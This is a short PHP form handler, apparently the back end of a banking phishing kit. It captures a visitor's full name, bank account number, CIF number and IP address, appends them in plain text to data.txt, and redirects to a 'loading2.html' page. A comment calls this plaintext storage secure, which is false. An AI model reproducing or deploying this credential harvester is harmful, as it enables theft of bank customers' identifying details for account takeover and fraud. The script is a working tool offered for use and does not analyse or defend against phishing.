<?php
// Function to get the client IP address
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    // Get client IP first
    $ipAddress = getClientIP();

    // Sanitize input data
    $fullName = htmlspecialchars($_POST['FullName'] ?? '');
    $accountNumber = htmlspecialchars($_POST['AccountNumber'] ?? '');
    $cifNumber = htmlspecialchars($_POST['CIFNumber'] ?? '');

    // Prepare data to be saved
    $data = "IP Address: $ipAddress\nFull Name: $fullName\nAccount Number: $accountNumber\nCIF Number: $cifNumber\n\n";

    // Save data securely
    $file = 'data.txt';
    file_put_contents($file, $data, FILE_APPEND | LOCK_EX);

    // Redirect to a success/loading page
    header("Location: loading2.html");
    exit();
}
?>

